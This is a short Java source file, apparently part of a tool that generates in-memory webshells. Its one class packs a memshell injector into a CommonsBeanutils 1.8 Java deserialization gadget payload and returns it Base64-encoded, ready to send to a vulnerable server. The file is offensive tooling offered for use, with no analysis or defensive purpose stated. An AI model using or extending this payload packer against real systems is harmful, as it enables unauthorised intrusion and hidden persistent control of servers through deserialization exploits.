package com.reajason.javaweb.memshell.packer.deserialize.java;

import com.reajason.javaweb.deserialize.DeserializeConfig;
import com.reajason.javaweb.deserialize.JavaDeserializeGenerator;
import com.reajason.javaweb.deserialize.PayloadType;
import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.Packer;
import lombok.SneakyThrows;

import java.util.Base64;



/**
 * @author ReaJason
 * @since 2025/2/17
 */
public class CommonsBeanutils18Packer implements Packer {

    @Override
    @SneakyThrows
    public String pack(GenerateResult generateResult) {
        DeserializeConfig deserializeConfig = new DeserializeConfig();
        deserializeConfig.setPayloadType(PayloadType.CommonsBeanutils18);
        return Base64.getEncoder().encodeToString(JavaDeserializeGenerator.generate(generateResult.getInjectorBytes(), deserializeConfig));
    }
}
